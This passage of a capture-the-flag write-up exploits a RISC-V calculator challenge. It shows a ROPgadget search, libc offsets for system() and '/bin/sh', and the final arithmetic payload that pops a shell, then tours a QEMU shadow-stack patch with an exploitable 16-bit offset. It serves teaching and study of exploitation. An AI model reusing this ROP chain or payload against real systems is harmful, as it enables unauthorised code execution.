|  |  |  |  |  |  |  |  |  |  |  |  |  |  | id = 2
|  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  | left:
|  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | kind = NODE_NUMBER
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | value = 1
|  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  | right:
|  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | kind = NODE_MINUS
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | id = 1
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | left:
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | kind = NODE_PLUS
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | id = 0
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | left:
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | kind = NODE_NUMBER
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | value = 0
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | right:
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | kind = NODE_NUMBER
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | value = 1
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | right:
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | kind = NODE_NUMBER
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | value = 1
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  | 
|  |  |  |  |  |  | 
|  |  |  |  |  | 
|  |  |  |  | 
|  |  |  | 
|  |  | 
|  | 
| 
| right:
| 
|  | kind = NODE_PLUS
|  | id = 18
|  | 
|  | left:
|  | 
|  |  | kind = NODE_TIMES
|  |  | id = 17
|  |  | 
|  |  | left:
|  |  | 
|  |  |  | kind = NODE_TIMES
|  |  |  | id = 16
|  |  |  | 
|  |  |  | left:
|  |  |  | 
|  |  |  |  | kind = NODE_NUMBER
|  |  |  |  | value = 0
|  |  |  | 
|  |  |  | right:
|  |  |  | 
|  |  |  |  | kind = NODE_NUMBER
|  |  |  |  | value = 0
|  |  |  | 
|  |  | 
|  |  | right:
|  |  | 
|  |  |  | kind = NODE_NUMBER
|  |  |  | value = 0
|  |  | 
|  | 
|  | right:
|  | 
|  |  | kind = NODE_NUMBER
|  |  | value = 1311768465173141112
|  | 
|
</code></pre><p>In this AST:</p><ul><li>node 0 is a descendant of node 15, the left child of node 19 (also the root node);</li><li>node 16 is a descendant of node 18, the right child of node 19;</li><li>node 16 has no descendants: since node 16 is not computed its descendants will neither so it is easier if it doesn&rsquo;t have any.</li></ul><p>Again, a hint to this bug was that the code pattern used here is still a bit contrived. A <code>completed</code> array is not really useful if we can travel the tree while visiting each node once and only once. Moreover, the implementation here was already doing this!</p><h2 id=its-rop-time>It&rsquo;s ROP time</h2><p>Since the beginning of the year, <a href=https://github.com/JonathanSalwan/ROPgadget>ROPGadget</a> has added support for RISCV-64, so we can make use of it.</p><p>A simple search on the challenge&rsquo;s <code>libc</code> yields loads of results:</p><pre tabindex=0><code>$ ROPgadget --binary build/sysroot/lib/libc.so.6

Unique gadgets found: 286370
</code></pre><p>Removing system and JOP gadgets outputs a more reasonable amount:</p><pre tabindex=0><code>$ ROPgadget --nosys --nojop --binary build/sysroot/lib/libc.so.6

Unique gadgets found: 5360
</code></pre><p>RISC-V leaf functions don&rsquo;t usually push and pop the <code>ra</code> register from the stack, but rather leave it intact. To avoid such functions, we can restrict our search to gadgets that actually do something with the register (hopefully popping it from the stack):</p><pre tabindex=0><code>$ ROPgadget --nosys --nojop --re &#34;ra.+&#34; --binary build/sysroot/lib/libc.so.6

Unique gadgets found: 584
</code></pre><p>Analyzing the results shows that a lot of the <code>libc</code> gadgets use condensed instructions: such instructions are 16-byte RISC-V instruction for common operations, as opposed to the classic 32-byte RISC-V instructions. Their purpose is to reduce code size.</p><p>In particular, here we can look for the <code>c.ldsp</code> instruction which expands to a stack pointer-relative <code>ld</code> instruction, that is to say a load operation from the stack.</p><p>A search focusing on loading the <code>ra</code> and <code>a0</code> (first argument) registers yields:</p><pre tabindex=0><code>$ ROPgadget --nosys --nojop --binary build/sysroot/lib/libc.so.6 | grep &#34;c.ldsp ra&#34; | grep &#34;c.ldsp a0&#34;

0x000000000005d5f2 : c.addi ra, 0x1d ; c.ldsp a0, 8(sp) ; c.ldsp ra, 0x18(sp) ; c.addi16sp sp, 0x20 ; c.jr ra
0x00000000000b4544 : c.addi4spn s0, sp, 0x358 ; c.ldsp ra, 0x28(sp) ; c.ldsp a0, 0x18(sp) ; c.addi16sp sp, 0x30 ; c.jr ra
0x000000000003b2fe : c.addi4spn s0, sp, 0x44 ; c.ldsp ra, 0x18(sp) ; c.ldsp a0, 8(sp) ; c.addi16sp sp, 0x20 ; c.jr ra
0x000000000003b42e : c.ld s0, 0x48(a2) ; c.ldsp ra, 0x18(sp) ; c.ldsp a0, 8(sp) ; c.addi16sp sp, 0x20 ; c.jr ra
0x000000000003908a : c.ldsp a0, 0x98(sp) ; c.ldsp ra, 0x138(sp) ; c.addi16sp sp, 0x140 ; c.jr ra
0x000000000005d5f4 : c.ldsp a0, 8(sp) ; c.ldsp ra, 0x18(sp) ; c.addi16sp sp, 0x20 ; c.jr ra
0x000000000003b300 : c.ldsp ra, 0x18(sp) ; c.ldsp a0, 8(sp) ; c.addi16sp sp, 0x20 ; c.jr ra
0x00000000000e66bc : c.ldsp ra, 0x18(sp) ; c.ldsp s0, 0x10(sp) ; c.ldsp a0, 8(sp) ; c.addi16sp sp, 0x20 ; c.jr ra
0x00000000000b4546 : c.ldsp ra, 0x28(sp) ; c.ldsp a0, 0x18(sp) ; c.addi16sp sp, 0x30 ; c.jr ra
0x0000000000039088 : c.nop ; c.ldsp a0, 0x98(sp) ; c.ldsp ra, 0x138(sp) ; c.addi16sp sp, 0x140 ; c.jr ra
</code></pre><p>Let&rsquo;s use this gadget: <code>0x000000000005d5f4 : c.ldsp a0, 8(sp) ; c.ldsp ra, 0x18(sp) ; c.addi16sp sp, 0x20 ; c.jr ra</code>.</p><p>Our target <code>ra</code> will be the address of the <code>system</code> function. We find that it is located at offset <code>0x45688</code> relative to the <code>libc</code> base:</p><pre tabindex=0><code>$ nm -gD riscv/sysroot/lib/libc.so.6 | grep system
0000000000045688 T __libc_system@@GLIBC_PRIVATE
00000000000e14e8 T svcerr_systemerr@GLIBC_2.27
0000000000045688 W system@@GLIBC_2.27
</code></pre><p>Our target <code>a0</code> will be the <code>/bin/sh</code> string. We find that it is located at offset <code>0x1086c8</code> relative to the <code>libc</code> base:</p><pre tabindex=0><code>$ ROPgadget --string &#34;/bin/sh&#34; --binary build/sysroot/lib/libc.so.6
Strings information
============================================================
0x00000000001086c8 : /bin/sh
</code></pre><p>Now since the address space is fixed for this binary let&rsquo;s use a debugger to dump it:</p><pre tabindex=0><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
       Start                End Perm     Size Offset File
     0x10000            0x16000 r-xp     6000      0 /home/challenger/calculator/build/bin/calculator
     0x16000            0x17000 rw-p     1000   6000 /home/challenger/calculator/build/bin/calculator
0x40007ff000       0x4000820000 rw-p    21000      0 [stack]
0x4000801000       0x400081d000 r-xp    1c000      0 [linker]
0x4000801000       0x400081d000 r-xp    1c000      0 /home/challenger/riscv/sysroot/lib/ld-linux-riscv64-lp64d.so.1
0x400081d000       0x400081f000 rw-p     2000  1c000 [linker]
0x400081d000       0x400081f000 rw-p     2000  1c000 /home/challenger/riscv/sysroot/lib/ld-linux-riscv64-lp64d.so.1
0x4000824000       0x4000955000 rw-p   131000      0 &lt;explored&gt;
</code></pre><p>Here the <code>libc</code> mapping starts at <code>0x4000824000</code> and corresponds to the last line. However, it is not really obvious due to limitations of QEMU&rsquo;s gdb stub. We can confirm the address by looking directly at the mappings in <code>/proc/maps</code>:</p><pre tabindex=0><code>$ pgrep qemu
715

$ cat /proc/715/maps | grep libc
4000824000-4000941000 r--p 00000000 fe:02 10511477                       /home/challenger/riscv/sysroot/lib/libc.so.6
4000941000-4000944000 r--p 0011d000 fe:02 10511477                       /home/challenger/riscv/sysroot/lib/libc.so.6
4000944000-4000946000 rw-p 00120000 fe:02 10511477                       /home/challenger/riscv/sysroot/lib/libc.so.6
7f9a67e38000-7f9a67e60000 r--p 00000000 fe:02 10009775                   /usr/lib/x86_64-linux-gnu/libc.so.6
7f9a67e60000-7f9a67ff5000 r-xp 00028000 fe:02 10009775                   /usr/lib/x86_64-linux-gnu/libc.so.6
7f9a67ff5000-7f9a6804d000 r--p 001bd000 fe:02 10009775                   /usr/lib/x86_64-linux-gnu/libc.so.6
7f9a6804d000-7f9a68051000 r--p 00214000 fe:02 10009775                   /usr/lib/x86_64-linux-gnu/libc.so.6
7f9a68051000-7f9a68053000 rw-p 00218000 fe:02 10009775                   /usr/lib/x86_64-linux-gnu/libc.so.6
</code></pre><p>There are 2 <code>libc</code> mappings: the x86 one for QEMU and the RISC-V one for the emulated program.</p><p>We can use the computation to fill the stack with the values that then will be popped by the gadget. Since these values are the results of operations, we need to compute each value relatively to the preceding one:</p><table><thead><tr><th>Name</th><th>Offset in libc</th><th>Absolute address</th><th>Hex => Int</th><th>Relative to precedent</th></tr></thead><tbody><tr><td>Gadget</td><td><code>0x5d5f4</code></td><td><code>0x40008815f4</code></td><td>274886825460</td><td>+274886825460</td></tr><tr><td><code>/bin/sh</code></td><td><code>0x1086c8</code></td><td><code>0x400092c6c8</code></td><td>274887526088</td><td>+700628</td></tr><tr><td><code>system()</code></td><td><code>0x45688</code></td><td><code>0x4000869688</code></td><td>274886727304</td><td>-798784</td></tr></tbody></table><p>Putting all these together we can finally get a shell with:</p><pre tabindex=0><code>(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(0+1-1)+(0*0*0+274886825460+0+700628+0-798784)
</code></pre><h1 id=the-shady-qemu-patch>The shady QEMU patch</h1><p>The challenge is not yet finished!</p><p>Up until now we were working on the calculator without the custom instructions implemented by the provided QEMU patch. If we use the original calculator with our previous payload, we don&rsquo;t get a shell, but a shadow exception:</p><pre tabindex=0><code>================================================
Shadow exception triggered!
(Conveniently handled as an illegal instruction)

The current dark page is 0x0000004000955000
The current dark offset is 0x8
================================================

Illegal instruction (core dumped)
</code></pre><p>This exception comes from the shadow stack mechanism that was added by the patch.</p><p>In brief: a special stack is created only to store return addresses. During return instructions, the address stored in the register (often popped from the classic stack prior to that) is compared with the one on the shadow stack to ensure it was not tampered with.</p><p>The challengers didn&rsquo;t initially know the patch was implementing a shadow stack and had to figure it out. As for this write-up, I will instead give a quick tour of the code.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/target/riscv/cpu.c b/target/riscv/cpu.c
</span></span><span style=display:flex><span>index 1e97473af2..fef657cc88 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/target/riscv/cpu.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/target/riscv/cpu.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -131,6 +131,7 @@ static const struct isa_ext_data isa_edata_arr[] = {
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     ISA_EXT_DATA_ENTRY(xtheadmempair, true, PRIV_VERSION_1_11_0, ext_xtheadmempair),
</span></span><span style=display:flex><span>     ISA_EXT_DATA_ENTRY(xtheadsync, true, PRIV_VERSION_1_11_0, ext_xtheadsync),
</span></span><span style=display:flex><span>     ISA_EXT_DATA_ENTRY(xventanacondops, true, PRIV_VERSION_1_12_0, ext_XVentanaCondOps),
</span></span><span style=display:flex><span><span style=color:#a6e22e>+    ISA_EXT_DATA_ENTRY(xishadow, true, PRIV_VERSION_1_12_0, ext_xishadow),
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> };
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span> static bool isa_ext_is_enabled(RISCVCPU *cpu,
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -1528,6 +1529,9 @@ static Property riscv_cpu_properties[] = {
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      * it with -x and default to &#39;false&#39;.
</span></span><span style=display:flex><span>      */
</span></span><span style=display:flex><span>     DEFINE_PROP_BOOL(&#34;x-misa-w&#34;, RISCVCPU, cfg.misa_w, false),
</span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    DEFINE_PROP_BOOL(&#34;xishadow&#34;, RISCVCPU, cfg.ext_xishadow, true),
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>     DEFINE_PROP_END_OF_LIST(),
</span></span><span style=display:flex><span> };
</span></span></code></pre></div><p>These lines are used to define a new RISC-V extension.</p><p>As per RISC-V extensions naming convention (See <a href=https://github.com/riscv/riscv-isa-manual/releases/download/isa-449cd0c/riscv-spec.pdf>RISC-V Unprivileged Specification</a>, chapter 29), the extension&rsquo;s name starts with an <code>x</code>, indicating a non-standard user-level extension. I then added an <code>i</code> to highlight that the added instructions are close to the ones in the base integer instruction set, but the spec doesn&rsquo;t actually require this.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/target/riscv/cpu.h b/target/riscv/cpu.h
</span></span><span style=display:flex><span>index 638e47c75a..cbdba0bc64 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/target/riscv/cpu.h
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/target/riscv/cpu.h
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -383,6 +383,9 @@ struct CPUArchState {
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     uint64_t kvm_timer_compare;
</span></span><span style=display:flex><span>     uint64_t kvm_timer_state;
</span></span><span style=display:flex><span>     uint64_t kvm_timer_frequency;
</span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    target_ulong dark_page;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    uint16_t dark_offset;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> };
</span></span><span style=display:flex><span>diff --git a/target/riscv/cpu_bits.h b/target/riscv/cpu_bits.h
</span></span><span style=display:flex><span>index fca7ef0cef..f930db99e4 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/target/riscv/cpu_bits.h
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/target/riscv/cpu_bits.h
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -523,6 +523,10 @@
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> /* Crypto Extension */
</span></span><span style=display:flex><span> #define CSR_SEED            0x015
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>+/* Shadow Extension */
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#define CSR_DARKPAGE        0x01a
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#define CSR_DARKOFF         0x01b
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> /* mstatus CSR bits */
</span></span><span style=display:flex><span> #define MSTATUS_UIE         0x00000001
</span></span><span style=display:flex><span> #define MSTATUS_SIE         0x00000002
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -677,6 +681,7 @@ typedef enum RISCVException {
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     RISCV_EXCP_LOAD_GUEST_ACCESS_FAULT = 0x15,
</span></span><span style=display:flex><span>     RISCV_EXCP_VIRT_INSTRUCTION_FAULT = 0x16,
</span></span><span style=display:flex><span>     RISCV_EXCP_STORE_GUEST_AMO_ACCESS_FAULT = 0x17,
</span></span><span style=display:flex><span><span style=color:#a6e22e>+    RISCV_EXCP_SHADOW = 0x18,
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> } RISCVException;
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span> #define RISCV_EXCP_INT_FLAG                0x80000000
</span></span></code></pre></div><p>The <code>CPUArchState</code> is then modified to add 2 CSRs (Control and Status Register, see <a href=https://github.com/riscv/riscv-isa-manual/releases/download/isa-449cd0c/riscv-spec.pdf>RISC-V Unprivileged Specification</a>, chapter 11, and <a href=https://github.com/riscv/riscv-isa-manual/releases/download/isa-449cd0c/riscv-privileged.pdf>RISC-V Privileged Specification</a>, chapter 2):</p><ul><li><code>dark_page</code>: it stores the base address of the shadow stack;</li><li><code>dark_offset</code>: it stores the current offset in the shadow stack. It is stored as an <strong><code>uint16_t</code></strong> only.</li></ul><p>We also define the CPU bits for these registers and a new exception.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/target/riscv/csr.c b/target/riscv/csr.c
</span></span><span style=display:flex><span>index 736ab64275..b81420f0e3 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/target/riscv/csr.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/target/riscv/csr.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -550,6 +550,14 @@ static RISCVException seed(CPURISCVState *env, int csrno)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> #endif
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>+static RISCVException shadow(CPURISCVState *env, int csrno)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+{
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    if (!riscv_cpu_cfg(env)-&gt;ext_xishadow) {
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        return RISCV_EXCP_ILLEGAL_INST;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    }
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return RISCV_EXCP_NONE;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+}
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> /* User Floating-Point CSRs */
</span></span><span style=display:flex><span> static RISCVException read_fflags(CPURISCVState *env, int csrno,
</span></span><span style=display:flex><span>                                   target_ulong *val)
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -3995,6 +4003,36 @@ RISCVException riscv_csrrw_debug(CPURISCVState *env, int csrno,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     return ret;
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>+/* Shadow */
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+static RISCVException read_dark_page(CPURISCVState *env, int csrno,
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                                     target_ulong *val)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+{
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    *val = env-&gt;dark_page;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return RISCV_EXCP_NONE;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+}
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+static RISCVException write_dark_page(CPURISCVState *env, int csrno,
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                                      target_ulong val)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+{
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    env-&gt;dark_page = val;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return RISCV_EXCP_NONE;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+}
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+static RISCVException read_dark_offset(CPURISCVState *env, int csrno,
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                                       target_ulong *val)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+{
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    *val = (target_ulong) env-&gt;dark_offset;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return RISCV_EXCP_NONE;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+}
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+static RISCVException write_dark_offset(CPURISCVState *env, int csrno,
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                                        target_ulong val)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+{
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    env-&gt;dark_offset = (uint16_t)(val &amp; 0xFFFF);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return RISCV_EXCP_NONE;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+}
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> /*
</span></span><span style=display:flex><span>  * Control and Status Register function table
</span></span><span style=display:flex><span>  * riscv_csr_operations::predicate() must be provided for an implemented CSR
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -4028,6 +4066,10 @@ riscv_csr_operations csr_ops[CSR_TABLE_SIZE] = {
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     /* Crypto Extension */
</span></span><span style=display:flex><span>     [CSR_SEED] = { &#34;seed&#34;, seed, NULL, NULL, rmw_seed },
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>+    /* Shadow Extension */
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    [CSR_DARKPAGE] = {&#34;vdarkpage&#34;, shadow, read_dark_page, write_dark_page},
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    [CSR_DARKOFF]  = {&#34;vdarkoff&#34;, shadow, read_dark_offset, write_dark_offset},
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> #if !defined(CONFIG_USER_ONLY)
</span></span><span style=display:flex><span>     /* Machine Timers and Counters */
</span></span><span style=display:flex><span>     [CSR_MCYCLE]    = { &#34;mcycle&#34;,    any,   read_hpmcounter,
</span></span></code></pre></div><p>Here we define the <code>shadow</code> function that checks if the extension is enabled, and getters and setters for the registers we just added.</p><p>The line <code>env->dark_offset = (uint16_t)(val & 0xFFFF);</code> highlights how unnatural it was to choose an <code>uint16_t</code> for the <code>dark_offset</code> register. The ability to perform on integer overflow on the <code>dark_offset</code> is indeed the main weakness of this shadow stack.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/target/riscv/insn32.decode b/target/riscv/insn32.decode
</span></span><span style=display:flex><span>index 73d5d1b045..1a6c9d881e 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/target/riscv/insn32.decode
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/target/riscv/insn32.decode
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -908,3 +908,8 @@ sm4ks       .. 11010 ..... ..... 000 ..... 0110011 @k_aes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> # *** RV32 Zicond Standard Extension ***
</span></span><span style=display:flex><span> czero_eqz   0000111  ..... ..... 101 ..... 0110011 @r
</span></span><span style=display:flex><span> czero_nez   0000111  ..... ..... 111 ..... 0110011 @r
</span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+# *** Shadow Extension ***
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+@shadow     .......  ..... ..... ... ..... ....... %rs1
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+dusk        0000000  00000 ..... 000 00000 0001011 @shadow
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+obscure     0000000  00000 ..... 001 00000 0001011 @shadow
</span></span></span></code></pre></div><p>This file defines the instructions decoding through <a href=https://www.qemu.org/docs/master/devel/decodetree.html>QEMU decodetree</a>. We can read the patterns of the added I-type instructions as:</p><table><thead><tr><th>Name</th><th>Immediate</th><th>Immediate</th><th>rs1</th><th>funct3</th><th>rd</th><th>opcode</th></tr></thead><tbody><tr><td>Bits position</td><td>31 - 25</td><td>24 - 20</td><td>19 - 15</td><td>14 - 12</td><td>11 - 7</td><td>6 - 0</td></tr><tr><td>dusk</td><td>0000000</td><td>00000</td><td>any</td><td>000</td><td>00000</td><td>0001011</td></tr><tr><td>obscure</td><td>0000000</td><td>00000</td><td>any</td><td>001</td><td>00000</td><td>0001011</td></tr></tbody></table><p>2 new instructions are added: <code>dusk</code> and <code>obscure</code>. They don&rsquo;t use the destination register (<code>rd</code>) nor the immediate, hence we require them filled with zeros. Only the 1st source register (<code>rs1</code>) is collected.</p><p>For our two instructions we use the major opcode <code>0001011</code> which is left empty as <code>custom-0</code> (see <a href=https://github.com/riscv/riscv-isa-manual/releases/download/isa-449cd0c/riscv-spec.pdf>RISC-V Unprivileged Specification</a>, table 27.1 and chapter 28), then we differentiate them using the minor opcode in <code>funct3</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/target/riscv/insn_trans/trans_shadow.c.inc b/target/riscv/insn_trans/trans_shadow.c.inc
</span></span><span style=display:flex><span>new file mode 100644
</span></span><span style=display:flex><span>index 0000000000..8d98f413bb
</span></span><span style=display:flex><span><span style=color:#f92672>--- /dev/null
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/target/riscv/insn_trans/trans_shadow.c.inc
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -0,0 +1,27 @@
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>+static bool trans_dusk(DisasContext *ctx, arg_dusk *a)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+{
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    TCGv_i32 csr_darkpage = tcg_constant_i32(CSR_DARKPAGE);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    gen_helper_csrw(cpu_env, csr_darkpage, get_gpr(ctx, a-&gt;rs1, EXT_NONE));
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    TCGv_i32 csr_darkoff = tcg_constant_i32(CSR_DARKOFF);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    TCGv zero = tcg_constant_tl(0);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    gen_helper_csrw(cpu_env, csr_darkoff, zero);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return true;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+}
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+static bool trans_obscure(DisasContext *ctx, arg_obscure *a)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+{
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    TCGv dark_offset = tcg_temp_new();
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    TCGv_i32 csr_darkoff = tcg_constant_i32(CSR_DARKOFF);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    gen_helper_csrr(dark_offset, cpu_env, csr_darkoff);
